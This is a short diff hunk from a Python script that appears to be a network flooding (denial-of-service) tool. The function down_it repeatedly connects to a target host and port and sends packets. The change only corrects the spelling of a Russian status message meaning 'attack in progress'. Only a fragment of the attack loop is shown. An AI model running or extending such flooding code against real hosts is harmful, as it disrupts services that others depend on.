@@ -41,7 +41,7 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94mВыполняеться атака\033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94mВыполняется атака\033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[91mОтключение...\033[0m")
